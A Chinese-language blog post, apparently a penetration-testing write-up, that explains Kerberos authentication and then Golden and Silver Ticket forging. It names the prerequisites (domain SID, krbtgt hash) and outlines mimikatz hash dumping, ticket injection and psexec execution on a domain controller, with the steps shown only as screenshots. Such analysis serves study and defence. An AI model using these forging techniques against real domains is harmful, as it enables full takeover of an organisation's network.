<!DOCTYPE html>



  


<html class="theme-next muse use-motion" lang="zh-Hans">
<head><meta name="generator" content="Hexo 3.9.0">
  <meta charset="UTF-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
<meta name="theme-color" content="#222">









<meta http-equiv="Cache-Control" content="no-transform">
<meta http-equiv="Cache-Control" content="no-siteapp">
















  
  
  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css">







<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">

<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css">


  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">


  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">


  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">


  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">





  <meta name="keywords" content="Windows,漏洞分析,协议分析,">





  <link rel="alternate" href="/atom.xml" title="大大黄的博客" type="application/atom+xml">






<meta name="description" content="Kerberos协议介绍什么是SSPI&amp;emsp;安全支持提供者接口（英语：Security Support Provider Interface，缩写SSPI）是Microsoft Windows操作系统中用于执行各种安全相关操作（如身份验证）的一个Win32 API。&amp;emsp;SSPI的功能是作为众多安全支持提供程序（SSP）的通用接口：安全支持提供者（Security Support Pr">
<meta name="keywords" content="Windows,漏洞分析,协议分析">
<meta property="og:type" content="article">
<meta property="og:title" content="结合ms14068对kerberos协议分析">
<meta property="og:url" content="http://lahonja.me/2019/08/05/结合ms14068对kerberos协议分析/index.html">
<meta property="og:site_name" content="大大黄的博客">
<meta property="og:description" content="Kerberos协议介绍什么是SSPI&amp;emsp;安全支持提供者接口（英语：Security Support Provider Interface，缩写SSPI）是Microsoft Windows操作系统中用于执行各种安全相关操作（如身份验证）的一个Win32 API。&amp;emsp;SSPI的功能是作为众多安全支持提供程序（SSP）的通用接口：安全支持提供者（Security Support Pr">
<meta property="og:locale" content="zh-Hans">
<meta property="og:image" content="http://lahonja.me/2019/08/05/结合ms14068对kerberos协议分析/2-1.png">
<meta property="og:image" content="http://lahonja.me/2019/08/05/结合ms14068对kerberos协议分析/1.jpeg">
<meta property="og:image" content="http://lahonja.me/2019/08/05/结合ms14068对kerberos协议分析/2.png">
<meta property="og:image" content="http://lahonja.me/2019/08/05/结合ms14068对kerberos协议分析/kerberos_detail.png">
<meta property="og:image" content="http://lahonja.me/2019/08/05/结合ms14068对kerberos协议分析/3-1.png">
<meta property="og:image" content="http://lahonja.me/2019/08/05/结合ms14068对kerberos协议分析/3-2.png">
<meta property="og:image" content="http://lahonja.me/2019/08/05/结合ms14068对kerberos协议分析/3-3.png">
<meta property="og:image" content="http://lahonja.me/2019/08/05/结合ms14068对kerberos协议分析/3-4.png">
<meta property="og:image" content="http://lahonja.me/2019/08/05/结合ms14068对kerberos协议分析/5-0.png">
<meta property="og:image" content="http://lahonja.me/2019/08/05/结合ms14068对kerberos协议分析/5-1.png">
<meta property="og:image" content="http://lahonja.me/2019/08/05/结合ms14068对kerberos协议分析/5-2.png">
<meta property="og:image" content="http://lahonja.me/2019/08/05/结合ms14068对kerberos协议分析/4-1.png">
<meta property="og:image" content="http://lahonja.me/2019/08/05/结合ms14068对kerberos协议分析/4-2.png">
<meta property="og:image" content="http://lahonja.me/2019/08/05/结合ms14068对kerberos协议分析/4-3.png">
<meta property="og:image" content="http://lahonja.me/2019/08/05/结合ms14068对kerberos协议分析/4-4.png">
<meta property="og:image" content="http://lahonja.me/2019/08/05/结合ms14068对kerberos协议分析/4-5.png">
<meta property="og:image" content="http://lahonja.me/2019/08/05/结合ms14068对kerberos协议分析/4-6.png">
<meta property="og:image" content="http://lahonja.me/2019/08/05/结合ms14068对kerberos协议分析/4-7.png">
<meta property="og:image" content="http://lahonja.me/2019/08/05/结合ms14068对kerberos协议分析/4-8.png">
<meta property="og:image" content="http://lahonja.me/2019/08/05/结合ms14068对kerberos协议分析/4-9.png">
<meta property="og:image" content="http://lahonja.me/2019/08/05/结合ms14068对kerberos协议分析/4-17.png">
<meta property="og:image" content="http://lahonja.me/2019/08/05/结合ms14068对kerberos协议分析/4-18.png">
<meta property="og:image" content="http://lahonja.me/2019/08/05/结合ms14068对kerberos协议分析/4-19.png">
<meta property="og:image" content="http://lahonja.me/2019/08/05/结合ms14068对kerberos协议分析/4-10.png">
<meta property="og:image" content="http://lahonja.me/2019/08/05/结合ms14068对kerberos协议分析/4-20.png">
<meta property="og:image" content="http://lahonja.me/2019/08/05/结合ms14068对kerberos协议分析/4-21.png">
<meta property="og:image" content="http://lahonja.me/2019/08/05/结合ms14068对kerberos协议分析/4-22.png">
<meta property="og:image" content="http://lahonja.me/2019/08/05/结合ms14068对kerberos协议分析/4-11.png">
<meta property="og:image" content="http://lahonja.me/2019/08/05/结合ms14068对kerberos协议分析/4-12.png">
<meta property="og:image" content="http://lahonja.me/2019/08/05/结合ms14068对kerberos协议分析/4-23.png">
<meta property="og:image" content="http://lahonja.me/2019/08/05/结合ms14068对kerberos协议分析/4-13.png">
<meta property="og:image" content="http://lahonja.me/2019/08/05/结合ms14068对kerberos协议分析/4-14.png">
<meta property="og:image" content="http://lahonja.me/2019/08/05/结合ms14068对kerberos协议分析/4-15.png">
<meta property="og:image" content="http://lahonja.me/2019/08/05/结合ms14068对kerberos协议分析/4-16.png">
<meta property="og:updated_time" content="2019-08-08T01:13:07.897Z">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="结合ms14068对kerberos协议分析">
<meta name="twitter:description" content="Kerberos协议介绍什么是SSPI&amp;emsp;安全支持提供者接口（英语：Security Support Provider Interface，缩写SSPI）是Microsoft Windows操作系统中用于执行各种安全相关操作（如身份验证）的一个Win32 API。&amp;emsp;SSPI的功能是作为众多安全支持提供程序（SSP）的通用接口：安全支持提供者（Security Support Pr">
<meta name="twitter:image" content="http://lahonja.me/2019/08/05/结合ms14068对kerberos协议分析/2-1.png">



<script type="text/javascript" id="hexo.configurations">
  var NexT = window.NexT || {};
  var CONFIG = {
    root: '/',
    scheme: 'Muse',
    version: '5.1.4',
    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
    fancybox: true,
    tabs: true,
    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
    duoshuo: {
      userId: '0',
      author: '博主'
    },
    algolia: {
      applicationID: '',
      apiKey: '',
      indexName: '',
      hits: {"per_page":10},
      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
    }
  };
</script>



  <link rel="canonical" href="http://lahonja.me/2019/08/05/结合ms14068对kerberos协议分析/">





  <title>结合ms14068对kerberos协议分析 | 大大黄的博客</title>
  








</head>

<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">

  
  
    
  

  <div class="container sidebar-position-left page-post-detail">
    <div class="headband"></div>

    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-wrapper">
  <div class="site-meta ">
    

    <div class="custom-logo-site-title">
      <a href="/" class="brand" rel="start">
        <span class="logo-line-before"><i></i></span>
        <span class="site-title">大大黄的博客</span>
        <span class="logo-line-after"><i></i></span>
      </a>
    </div>
      
        <p class="site-subtitle">lahonja's Blog</p>
      
  </div>

  <div class="site-nav-toggle">
    <button>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
    </button>
  </div>
</div>

<nav class="site-nav">
  

  
    <ul id="menu" class="menu">
      
        
        <li class="menu-item menu-item-home">
          <a href="/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-home"></i> <br>
            
            首页
          </a>
        </li>
      
        
        <li class="menu-item menu-item-tags">
          <a href="/tags/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br>
            
            标签
          </a>
        </li>
      
        
        <li class="menu-item menu-item-archives">
          <a href="/archives/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br>
            
            归档
          </a>
        </li>
      

      
    </ul>
  

  
</nav>



 </div>
    </header>

    <main id="main" class="main">
      <div class="main-inner">
        <div class="content-wrap">
          <div id="content" class="content">
            

  <div id="posts" class="posts-expand">
    

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://lahonja.me/2019/08/05/结合ms14068对kerberos协议分析/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="LAHONJA">
      <meta itemprop="description" content>
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="大大黄的博客">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">结合ms14068对kerberos协议分析</h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-08-05T14:14:23+08:00">
                2019-08-05
              </time>
            

            

            
          </span>

          
            <span class="post-category">
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">分类于</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/内网渗透/" itemprop="url" rel="index">
                    <span itemprop="name">内网渗透</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        <h2 id="Kerberos协议介绍"><a href="#Kerberos协议介绍" class="headerlink" title="Kerberos协议介绍"></a>Kerberos协议介绍</h2><h3 id="什么是SSPI"><a href="#什么是SSPI" class="headerlink" title="什么是SSPI"></a>什么是SSPI</h3><p>&emsp;安全支持提供者接口（英语：Security Support Provider Interface，缩写SSPI）是Microsoft Windows操作系统中用于执行各种安全相关操作（如身份验证）的一个Win32 API。<br>&emsp;SSPI的功能是作为众多安全支持提供程序（SSP）的通用接口：安全支持提供者（Security Support Provider）是可以为应用程序提供一种或多种安全功能包的动态链接库（dynamic-link library）。</p>
<h3 id="Windows常用的SSP"><a href="#Windows常用的SSP" class="headerlink" title="Windows常用的SSP"></a>Windows常用的SSP</h3><ul>
<li>NTLM（Windows NT 3.51中引入）(msv1_0.dll) - 为Windows 2000之前的客户端-服务器域和非域身份验证（SMB/CIFS）提供NTLM质询/响应身份验证。</li>
<li>Kerberos（Windows 2000中引入，Windows Vista中更新为支持AES）(kerberos.dll) - Windows 2000及更高版本中首选的客户端-服务器域相互身份验证。</li>
<li>Negotiate（Windows 2000中引入）(secur32.dll) - Negotiate安全包在Kerberos和NTLM之间进行选择协商选择。Negotiate默认使用Kerberos，当Kerberos不能被身份验证中涉及的某个系统使用时，将使用NTLM。</li>
<li>摘要SSP（Windows XP中引入）(wdigest.dll) - 在Windows与Kerberos不可用的非Windows系统间提供基于HTTP和SASL身份验证的质询/响应。</li>
<li>凭据 (CredSSP)（Windows Vista中引入，Windows XP SP3上也可用）(credssp.dll) - 为远程桌面连接提供单点登录（SSO）和网络级身份验证。<a id="more"></a>
<blockquote>
<p>参考： <a href="https://zh.wikipedia.org/wiki/SSPI" target="_blank" rel="noopener">https://zh.wikipedia.org/wiki/SSPI</a></p>
</blockquote>
</li>
</ul>
<h3 id="Kerberos形象化理解"><a href="#Kerberos形象化理解" class="headerlink" title="Kerberos形象化理解"></a>Kerberos形象化理解</h3><p>&emsp;Kerberos协议中主要涉及到Client、AS（也被称为KDC）、TGS、SS。我们形象化到我们的生活中，可以分别理解为4个主体：张三（Client）、公安局（AS）、房管局（TGS）、售楼部（SS）。<br>&emsp;这里以买房子为例，张三到售楼部买房子，但是售楼部是需要张三提供房管局签发的允许购房证明；张三到了房管局，但是房管局为了确认张三的身份，需要张三到公安局开一张个人身份证明（ <strong>公安局为了这个证明不用做其他用途，将这个证明加了密的，只有公安局能够解开；想要查验这个证明是否有效，需要房管局向公安局查验</strong> ）。当然上述流程是一个逆向去开证明的流程，为了不多跑路，这个流程一开始就是公开的。所以正常的步骤应该是：</p>
<ol>
<li>张三到公安局开身份证明（Client-&gt;AS）</li>
<li>公安局给张三签发只公安局能看懂的身份证明（AS-&gt;Client，TGT票据）</li>
<li>张三拿着公安局给的证明去房管局开允许购房证明 （Client-&gt;TGS）</li>
<li>房管局给张三签发只有房管局能看懂的允许购房证明 （TGS-&gt;Client，ST票据）</li>
<li>张三拿着房管局的允许购房证明去售楼部买房（Client-&gt;SS）</li>
<li>售楼部向房管局查验证明通过后，张三就可以买房了（SS-&gt;Client）</li>
</ol>
<h3 id="Kerberos协议具体介绍"><a href="#Kerberos协议具体介绍" class="headerlink" title="Kerberos协议具体介绍"></a>Kerberos协议具体介绍</h3><p>&emsp;Authentication Server： AS的作用就是验证Client端的身份（确定你是身份证上的本人），验证通过就会给一张TGT（Ticket Granting Ticket）票给Client。<br>&emsp;Ticket Granting Server： TGS的作用是通过AS发送给Client的票（TGT）换取访问Server端的票（ST）。ST（Service Ticket）也有资料称为TGS Ticket。<br>&emsp;名词解析：</p>
<ul>
<li>KDC(Key Distribution Center):密钥分发中心，里面包含两个服务：AS和TGS</li>
<li>AS(Authentication Server):身份认证服务</li>
<li>TGS(Ticket Granting Server):票据授予服务,该服务提供的票据也称为 TGS 或者叫白银票据，也被称为ST。</li>
<li>TGT(Ticket Granting Ticket):由身份认证服务授予的票据(黄金票据)，用于身份认证，存储在内存，默认有效期为10小时<img src="/2019/08/05/结合ms14068对kerberos协议分析/2-1.png">

</li>
</ul>
<p>&emsp;Kerberos认证流程简化如下（<a href="https://medium.com/@robert.broeckelmann/kerberos-wireshark-captures-a-windows-login-example-151fabf3375a" target="_blank" rel="noopener">具体数据包解析传送门</a>）</p>
<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line">1. KRB_AS_REQ</span><br><span class="line">   <span class="built_in"> Client </span>-&gt; Server(AS) 认证服务</span><br><span class="line">    Message0: </span><br><span class="line">        加密: client_secret_key</span><br><span class="line">        数据: Realm,principal,IP,Pre-authentication data<span class="built_in">..</span>.</span><br><span class="line">        </span><br><span class="line">2. KRB_AS_RSP</span><br><span class="line">    Server(AS) 认证服务 -&gt; Client</span><br><span class="line">    Message1: </span><br><span class="line">        加密: client_secret_key</span><br><span class="line">        数据: TGS name,TGS_session_key</span><br><span class="line">    Message2(访问TGS的票据TGT): Client解密不了</span><br><span class="line">        加密: TGS_secret_key(krbtgt_hash)</span><br><span class="line">        数据: Username,TGS Name,TGS_session_key<span class="built_in">..</span>.</span><br><span class="line">        </span><br><span class="line">3. KRB_TGS_REQ</span><br><span class="line">   <span class="built_in"> Client </span>-&gt; Server(TGS) 票据授权服务</span><br><span class="line">    Message3: Client解密不了</span><br><span class="line">        加密: 由上一步服务端使用 TGS_secret_key(krbtgt_hash) 加密</span><br><span class="line">        数据: 直接转发Message2(访问TGS的票据TGT)</span><br><span class="line">    Message4:</span><br><span class="line">        加密: TGS_session_key</span><br><span class="line">        数据: authenticator</span><br><span class="line">        </span><br><span class="line">4. KRB_TGS_RSP</span><br><span class="line">    Server(TGS) 认证服务 -&gt; Client</span><br><span class="line">    Message5(访问SS的票据ST): Client解密不了</span><br><span class="line">        加密: Service_Secret_Key</span><br><span class="line">        数据: Service_Session_Key</span><br><span class="line">    Message6:</span><br><span class="line">        加密: TGS_session_key</span><br><span class="line">        数据: Service_Session_Key</span><br><span class="line">        </span><br><span class="line">5. KRB_AP_REQ</span><br><span class="line">   <span class="built_in"> Client </span>-&gt; Server(SS) 应用服务</span><br><span class="line">    Message5(访问SS的票据ST): Client解密不了</span><br><span class="line">        加密: Service_Secret_Key</span><br><span class="line">        数据: Username,Service Name,Service_Session_Key</span><br><span class="line">    Message7:</span><br><span class="line">        加密: Service_Session_Key</span><br><span class="line">        数据: authenticator</span><br><span class="line">        </span><br><span class="line">6. KRB_AP_RSP</span><br><span class="line">    Server(SS) 应用服务 -&gt; Client</span><br><span class="line">    Message8:</span><br><span class="line">        加密方式: Service_Session_Key</span><br><span class="line">        数据: authenticator</span><br></pre></td></tr></table></figure>

<p>下面是三张详细的Kerberos认证过程流程图：</p>
<img src="/2019/08/05/结合ms14068对kerberos协议分析/1.jpeg">
<img src="/2019/08/05/结合ms14068对kerberos协议分析/2.png">
<img src="/2019/08/05/结合ms14068对kerberos协议分析/kerberos_detail.png">

<h3 id="Kerberos拓展阅读"><a href="#Kerberos拓展阅读" class="headerlink" title="Kerberos拓展阅读"></a>Kerberos拓展阅读</h3><ul>
<li><a href="https://docs.microsoft.com/en-us/previous-versions/aa302203(v=msdn.10)#top-level-pac-structure" target="_blank" rel="noopener">PAC数据结构</a></li>
<li><a href="https://blogs.technet.microsoft.com/apgceps/2011/09/12/packerberos-2/" target="_blank" rel="noopener">PAC在Kerberos认证协议中的作用（一）</a></li>
<li><a href="https://blogs.technet.microsoft.com/apgceps/2011/09/19/packerberos/" target="_blank" rel="noopener">PAC在Kerberos认证协议中的作用(二)</a></li>
<li><a href="https://blogs.msdn.microsoft.com/openspecification/2009/04/24/understanding-microsoft-kerberos-pac-validation/" target="_blank" rel="noopener">了解Microsoft Kerberos PAC验证</a></li>
<li><a href="https://www.anquanke.com/post/id/172900#h2-1" target="_blank" rel="noopener">Kerberos协议探索系列之票据篇</a></li>
</ul>
<h2 id="黄金票据"><a href="#黄金票据" class="headerlink" title="黄金票据"></a>黄金票据</h2><h3 id="什么是TGT票据"><a href="#什么是TGT票据" class="headerlink" title="什么是TGT票据"></a>什么是TGT票据</h3><p>&emsp;TGT票据，ticket-granting-tickets，是客户端通过身份认证服务器(AS)的认证之后，AS签发给Client的一个身份票据，可以使用这个凭据访问其他服务（TGS要检查这个TGT是否拥有将要访问服务的权限）。通过windows自带命令<a href="https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/klist" target="_blank" rel="noopener">klist</a>，可以查看本机缓存的TGT票据，或者使用<a href="https://gallery.technet.microsoft.com/List-All-Cached-Kerberos-5ba41829" target="_blank" rel="noopener">这个Powershell脚本</a>来查看本机的票据。结果如下：</p>
<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">Kerberos Tickets <span class="keyword">for</span> LogonID 0x74bba</span><br><span class="line">*****************************</span><br><span class="line">Logon Type: 5</span><br><span class="line">Session ID: 0x74bba</span><br><span class="line">Auth Method: Kerberos</span><br><span class="line">Current LogonId is 0:0x21957b6</span><br><span class="line">Targeted LogonId is 0:0x74bba</span><br><span class="line">Cached TGT:</span><br><span class="line">ServiceName : krbtgt</span><br><span class="line">TargetName (SPN) : krbtgt</span><br><span class="line">ClientName : adfs</span><br><span class="line">DomainName : RCBJ.NET</span><br><span class="line">TargetDomainName : RCBJ.NET</span><br><span class="line">AltTargetDomainName: RCBJ.NET</span><br><span class="line">Ticket Flags : 0x40e10000 -&gt; forwardable renewable initial pre_authent name_canonicalize</span><br><span class="line">Session Key : KeyType 0x12 — AES-256-CTS-HMAC-SHA1–96</span><br><span class="line"> : KeyLength 32–25 2b a5 21 cb 56 5f f1 f6 ad e9 35 73 7b 31 06 2e e8 8e 67 f7 bb 9f 24 a7 a5 50 fd</span><br><span class="line">d8 d0 43 48</span><br><span class="line">StartTime : 9/6/2018 23:23:25 (local)</span><br><span class="line">EndTime : 9/7/2018 9:23:25 (local)</span><br><span class="line">RenewUntil : 9/9/2018 2:27:40 (local)</span><br><span class="line">TimeSkew : + 0:00 minute(s)</span><br><span class="line">EncodedTticket : (size: 1003)</span><br><span class="line">0000 61 82 03 e7 30 82 03 e3:a0 03 02 01 05 a1 0a 1b a…0………<span class="built_in">..</span></span><br><span class="line">0010 08 52 43 42 4a 2e 4e 45:54 a2 1d 30 1b a0 03 02 .RCBJ.NET<span class="built_in">..</span>0….</span><br><span class="line">0020 01 02 a1 14 30 12 1b 06:6b 72 62 74 67 74 1b 08 ….0…krbtgt<span class="built_in">..</span></span><br><span class="line">0030 52 43 42 4a 2e 4e 45 54:a3 82 03 af 30 82 03 ab RCBJ.NET….0…</span><br><span class="line">0040 a0 03 02 01 12 a1 03 02:01 02 a2 82 03 9d 04 82 …………….</span><br><span class="line">0050 03 99 6f 06 82 a8 18 3f:60 c7 b2 b7 2a 2b 18 e5 <span class="built_in">..</span>o….?`…*+<span class="built_in">..</span></span><br><span class="line">Ticket #0 : @&#123;<span class="attribute">Client</span>=adfs @ RCBJ.NET; <span class="attribute">Server</span>=krbtgt/RCBJ.NET @ RCBJ.NET; KerbTicket Encryption</span><br><span class="line"> <span class="attribute">Type</span>=AES-256-CTS-HMAC-SHA1–96; Ticket <span class="attribute">Flags</span>=0x40e10000 -&gt; forwardable renewable initial pre_authent</span><br><span class="line"> name_canonicalize ; Start <span class="attribute">Time</span>=9/6/2018 23:23:25 (local); End <span class="attribute">Time</span>=9/7/2018 9:23:25 (local); Renew</span><br><span class="line"> <span class="attribute">Time</span>=9/9/2018 2:27:40 (local); Session Key <span class="attribute">Type</span>=AES-256-CTS-HMAC-SHA1–96&#125;</span><br><span class="line">Ticket #1 : @&#123;<span class="attribute">Client</span>=adfs @ RCBJ.NET; <span class="attribute">Server</span>=krbtgt/RCBJ.NET @ RCBJ.NET; KerbTicket Encryption</span><br><span class="line"> <span class="attribute">Type</span>=AES-256-CTS-HMAC-SHA1–96; Ticket <span class="attribute">Flags</span>=0x60a10000 -&gt; forwardable forwarded renewable pre_authent</span><br><span class="line"> name_canonicalize ; Start <span class="attribute">Time</span>=9/2/2018 2:27:49 (local); End <span class="attribute">Time</span>=9/2/2018 12:27:40 (local); Renew</span><br><span class="line"> <span class="attribute">Time</span>=9/9/2018 2:27:40 (local); Session Key <span class="attribute">Type</span>=AES-256-CTS-HMAC-SHA1–96&#125;</span><br><span class="line">Ticket #2 : @&#123;<span class="attribute">Client</span>=adfs @ RCBJ.NET; <span class="attribute">Server</span>=ldap/EC2AMAZ-A6G81N3.rcbj.net @ RCBJ.NET; KerbTicket Encryption</span><br><span class="line"> <span class="attribute">Type</span>=AES-256-CTS-HMAC-SHA1–96; Ticket <span class="attribute">Flags</span>=0x40a50000 -&gt; forwardable renewable pre_authent ok_as_delegate</span><br><span class="line"> name_canonicalize ; Start <span class="attribute">Time</span>=9/7/2018 1:38:28 (local); End <span class="attribute">Time</span>=9/7/2018 9:23:25 (local); Renew</span><br><span class="line"> <span class="attribute">Time</span>=9/9/2018 2:27:40 (local); Session Key <span class="attribute">Type</span>=AES-256-CTS-HMAC-SHA1–96&#125;</span><br><span class="line">Ticket #3 : @&#123;<span class="attribute">Client</span>=adfs @ RCBJ.NET; <span class="attribute">Server</span>=ldap/EC2AMAZ-A6G81N3.rcbj.net/rcbj.net @ RCBJ.NET; KerbTicket Encryption</span><br><span class="line"> <span class="attribute">Type</span>=AES-256-CTS-HMAC-SHA1–96; Ticket <span class="attribute">Flags</span>=0x40a50000 -&gt; forwardable renewable pre_authent ok_as_delegate</span><br><span class="line"> name_canonicalize ; Start <span class="attribute">Time</span>=9/6/2018 23:28:02 (local); End <span class="attribute">Time</span>=9/7/2018 9:23:25 (local); Renew</span><br><span class="line"> <span class="attribute">Time</span>=9/9/2018 2:27:40 (local); Session Key <span class="attribute">Type</span>=AES-256-CTS-HMAC-SHA1–96&#125;</span><br></pre></td></tr></table></figure>

<h3 id="黄金票据原理"><a href="#黄金票据原理" class="headerlink" title="黄金票据原理"></a>黄金票据原理</h3><p>&emsp;<strong>黄金票据的漏洞主要出现在kerberos认证过程中的KRB_TGS_REQ请求过程中，我们如果拥有krbtgt账号的密码哈希，我们则可以伪造成域内的任意用户。</strong><br>&emsp;Golden Ticket（下面称为黄金票据）是伪造的TGT（Ticket Granting Ticket），因为只要有了高权限的TGT，那么就可以发送给TGS换取任意服务的ST。通过前面的分析，认识到TGT是AS签发给Client的，并且是使用AS的用户密码hash进行加密（在域中默认为krbtgt）；所以只要知道了krbtgt账号密码的hash，就可以进行任意票据伪造。<br>&emsp;当用户与AS(KDC)之间完成了认证过程之后， Client需要访问Server所提供的某项服务时， Server为了判断用户是否具有合法的权限需要将Client的User SID等信息传递给AS(KDC)， AS(KDC)通过SID判断用户的用户组信息， 用户权限等， 进而将结果返回给Server， Server再将此信息与用户所索取的资源的ACL进行比较， 最后决定是否给用户提供相应的服务。<br>&emsp;认识了上述票据的权限认证原理后，我们知道票据的权限主要是取决于票据中保存的用户的SID，因为AS判断权限时，时通过票据中用户的SID进行判断的。SID的末尾为RID，是域用户的唯一对象标识。<a href="https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-dtyp/81d92bba-d22b-4a8c-908a-554ab29148ab" target="_blank" rel="noopener">点击这里查看常见SID含义</a>。</p>
<ul>
<li>ADMINISTRATOR SID：S-1-5-21 <domainid> -500</domainid></li>
<li>管理员组：S-1-5-21-DOMAINID-513</li>
<li>域用户SID：S-1-5-21-DOMAINID-513</li>
<li>域管理员SID：S-1-5-21-DOMAINID-512</li>
<li>架构管理员SID：S-1-5-21-DOMAINID-518</li>
<li>企业管理员SID：S-1-5-21-DOMAINID-519（只有在森林根域中创建伪造票证时才有效，但为AD森林管理员权限添加使用/ sids参数）</li>
<li>组策略创建者所有者SID：S-1-5-21 <domainid> -520</domainid></li>
</ul>
<h3 id="黄金票据利用条件"><a href="#黄金票据利用条件" class="headerlink" title="黄金票据利用条件"></a>黄金票据利用条件</h3><ul>
<li>域名称</li>
<li>域SID值，注意是去掉最后一个-后面的值</li>
<li>域KRBTGT账户密码HASH</li>
<li>伪造用户名，可以是任意的</li>
</ul>
<h3 id="黄金票据利用过程"><a href="#黄金票据利用过程" class="headerlink" title="黄金票据利用过程"></a>黄金票据利用过程</h3><ol>
<li>使用mimikatz抓取krbtgt用户的密码HASH及域SID<img src="/2019/08/05/结合ms14068对kerberos协议分析/3-1.png"></li>
<li>使用mimikatz伪造票据并注入到session<img src="/2019/08/05/结合ms14068对kerberos协议分析/3-2.png"></li>
<li>查看当前Session的权限<img src="/2019/08/05/结合ms14068对kerberos协议分析/3-3.png"></li>
<li>使用psexec在DC上执行命令<img src="/2019/08/05/结合ms14068对kerberos协议分析/3-4.png">

</li>
</ol>
<h2 id="白银票据"><a href="#白银票据" class="headerlink" title="白银票据"></a>白银票据</h2><h3 id="白银票据原理"><a href="#白银票据原理" class="headerlink" title="白银票据原理"></a>白银票据原理</h3><p><strong>白银票据的漏洞主要出现在kerberos认证过程中的KRB_AP_REQ请求过程中，我们如果拥有ServiceAccount账号的密码哈希，我们则可以域内的任意用户去访问对应的服务。</strong><br>白银票据(Silver Tickets)是伪造Kerberos中授予访问服务（Service Ticket）的票据（服务票据，简称ST）。使用服务票据可以直接访问服务，与域控制器没有KRB_AS_REQ/KRB_AS_REP，也没有KRB_TGS_REQ/KRB_TGS_REP通信。由于银票是伪造的ST，所以没有与域控制器通信。</p>
